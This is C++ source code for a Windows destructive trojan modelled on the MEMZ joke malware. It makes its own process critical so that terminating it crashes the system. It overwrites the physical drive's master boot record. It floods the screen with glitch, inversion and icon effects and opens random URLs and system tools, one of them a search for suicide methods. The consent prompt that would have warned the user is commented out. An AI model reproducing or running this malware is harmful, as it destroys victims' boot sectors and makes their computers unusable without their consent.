#include <Windows.h>
#include <random>
#include <cstdio>
#include <thread>

constexpr unsigned char code1[] = {
    
};

constexpr unsigned char code2[] = {
    
};

const char *sites[] = {
    "https://duckduckgo.com/?q=best+way+to+kill+yourself",
    "https://duckduckgo.com/?q=how+2+remove+a+virus",
    "https://duckduckgo.com/?q=mcafee+vs+norton",
    "https://duckduckgo.com/?q=how+to+send+a+virus+to+my+friend",
    "https://duckduckgo.com/?q=minecraft+hax+download+no+virus",
    "https://duckduckgo.com/?q=how+to+get+money",
    "https://duckduckgo.com/?q=bonzi+buddy+download+free",
    "https://duckduckgo.com/?q=how+2+buy+weed",
    "https://duckduckgo.com/?q=how+to+code+a+virus+in+visual+basic",
    "https://duckduckgo.com/?q=what+happens+if+you+delete+system32",
    "https://duckduckgo.com/?q=g3t+r3kt",
    "https://duckduckgo.com/?q=batch+virus+download",
    "https://duckduckgo.com/?q=virus.exe",
    "https://duckduckgo.com/?q=internet+explorer+is+the+best+browser",
    "https://duckduckgo.com/?q=facebook+hacking+tool+free+download+no+virus+working+2016",
    "https://duckduckgo.com/?q=virus+builder+legit+free+download",
    "https://duckduckgo.com/?q=how+to+create+your+own+ransomware",
    "https://duckduckgo.com/?q=how+to+remove+memz+trojan+virus",
    "https://duckduckgo.com/?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
    "https://duckduckgo.com/?q=dank+memz",
    "https://duckduckgo.com/?q=how+to+download+memz",
    "https://duckduckgo.com/?q=half+life+3+release+date",
    "https://duckduckgo.com/?q=is+illuminati+real",
    "https://duckduckgo.com/?q=montage+parody+making+program+2016",
    "https://duckduckgo.com/?q=the+memz+are+real",
    "https://duckduckgo.com/?q=stanky+danky+maymays",
    "https://duckduckgo.com/?q=john+cena+midi+legit+not+converted",
    "https://duckduckgo.com/?q=vinesauce+meme+collection",
    "https://duckduckgo.com/?q=skrillex+scay+onster+an+nice+sprites+midi",
    "http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
    "http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
    "http://play.clubpenguin.com",
    "http://pcoptimizerpro.com",
    "http://softonic.com",
    "calculator",
    "notepad",
    "cmd",
    "write",
    "regedit",
    "explorer",
    "taskmgr",
    "msconfig",
    "mspaint",
    "devmgmt.msc",
    "control",
    "mmc",
};

constexpr size_t code1_len = sizeof(code1);
constexpr size_t code2_len = sizeof(code2);

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN   BOOLEAN       NewValue,
    OUT  PBOOLEAN      OldValue, 
    IN   BOOLEAN       IsWinlogon
);

template<typename T>
T random(T a, T b)
{
    std::random_device rnd;
    std::mt19937 mt(rnd());
    std::uniform_int_distribution<> rand(a, b);
    return rand(mt);
}

BOOL ProtectProcess(LPCSTR lpszPriv)
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProtectProcess() 
{
    RtlSetProcessIsCritical fSetCritical;

    HANDLE hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL)
    {
        ProtectProcess("SeDebugPrivilege");
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return TRUE;
    }
    return FALSE;
}

DWORD WINAPI mbr(LPVOID lpstart)
{
    HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (drive == INVALID_HANDLE_VALUE)
        ExitProcess(2);

    unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);

    // Join the two code parts together
    int i = 0;
    for (; i < code1_len; i++)
        *(bootcode + i) = *(code1 + i);
    for (i = 0; i < code2_len; i++)
        *(bootcode + i + 0x1fe) = *(code2 + i);

    DWORD wb;
    if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
        ExitProcess(3);

    CloseHandle(drive);
    return 0;
}

DWORD WINAPI message(LPVOID lpstart)
{
    while (1) {
        MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
        Sleep(10000);
    }
}

DWORD WINAPI colours(LPVOID lpstart)
{
    HWND upWnd = GetForegroundWindow();
    HDC upHdc = GetDC(upWnd);
    HDC desktop = GetDC(NULL);
    int xs = GetSystemMetrics(SM_CXSCREEN);
    int ys = GetSystemMetrics(SM_CYSCREEN);
    while (1) {
        upWnd = GetForegroundWindow();
        upHdc = GetDC(upWnd);
        desktop = GetDC(NULL);
        BitBlt(desktop, -1, 1, xs, ys, upHdc, 2, 2, 0x999999);
        Sleep(500);
    }
}

DWORD WINAPI glitches(LPVOID lpstart)
{
    HDC hdc = GetDC(0);
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);
    while (1)
    {
        int x1 = random(0, x - 400);
        int y1 = random(0, y - 400);
        int x2 = random(0, x - 400);
        int y2 = random(0, y - 400);
        int w  = random(0, 400);
        int h  = random(0, 400);
        BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, SRCCOPY);
        Sleep(150);
    }
}

DWORD WINAPI tunnel(LPVOID lpstart)
{
    HDC hdc = GetDC(0);
    RECT rect;
    HWND hwnd = GetDesktopWindow();
    while (1)
    {
        GetWindowRect(hwnd, &rect);
        StretchBlt(hdc, 25, 25, rect.right - 50, rect.bottom - 50, hdc, 0, 0, rect.right, rect.bottom, SRCCOPY);
        Sleep(100);
    }
}

DWORD WINAPI invers(LPVOID lpstart)
{
    HDC hdc = GetDC(0);
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);
    while (1)
    {
        BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
        Sleep(2000);
    }
}

DWORD WINAPI drawwarning(LPVOID lpstart)
{
    HDC hdc = GetDC(0);
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);
    while (1)
    {
        DrawIcon(hdc, random(0, x), random(0, y), LoadIcon(0, IDI_WARNING));
        Sleep(100);
    }
}

DWORD WINAPI drawerror(LPVOID lpstart)
{
    HDC hdc = GetDC(0);
    POINT pt;
    while (1)
    {
        GetCursorPos(&pt);
        DrawIcon(hdc, pt.x, pt.y, LoadIcon(0, IDI_HAND));
    }
}

constexpr size_t nSites = sizeof(sites) / sizeof(void *);

void payloadExecute()
{
    Sleep(20000);
    while (1) {
        ShellExecuteA(NULL, "open", (LPCSTR)sites[random((size_t)0, nSites)], NULL, NULL, SW_SHOWDEFAULT);
        Sleep(10000);
    }
}

int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), int(d))
{
    std::thread th(payloadExecute);
    ProtectProcess();
    CreateThread(0, 0, mbr, 0, 0, 0);
    Sleep(60000);
    CreateThread(0, 0, invers, 0, 0, 0);
    Sleep(30000);
    CreateThread(0, 0, message, 0, 0, 0);
    Sleep(30000);
    CreateThread(0, 0, drawerror, 0, 0, 0);
    CreateThread(0, 0, drawwarning, 0, 0, 0);
    Sleep(40000);
    CreateThread(0, 0, tunnel, 0, 0, 0);
    Sleep(50000);
    CreateThread(0, 0, glitches, 0, 0, 0);
    CreateThread(0, 0, colours, 0, 0, 0);
    Sleep(-1);
    /*if (MessageBoxA(NULL, "The software you just executed is considered malware,This malware will harm your computer and makes it unusable,If you are seeing this message without knowing what you just executed, simply press No and nothing will happen,If you know what this malware does and are using a safe environment to test, press Yes to start it", "Warning!", MB_YESNO) == IDYES)
    {
        ProtectProcess();
        CreateThread(0, 0, mbr, 0, 0, 0);
        Sleep(30000);
        CreateThread(0, 0, drawerror, 0, 0, 0);
        Sleep(30000);
        CreateThread(0, 0, message, 0, 0, 0);
        CreateThread(0, 0, drawwarning, 0, 0, 0);
        Sleep(30000);
        CreateThread(0, 0, invers, 0, 0, 0);
        Sleep(40000);
        CreateThread(0, 0, tunnel, 0, 0, 0);
        Sleep(50000);
        CreateThread(0, 0, glitches, 0, 0, 0);
        CreateThread(0, 0, colours, 0, 0, 0);
        Sleep(-1);
    }
    else
    {
        MessageBoxA(NULL, "ok!", "", MB_OK);
    }*/
    return 0;
}
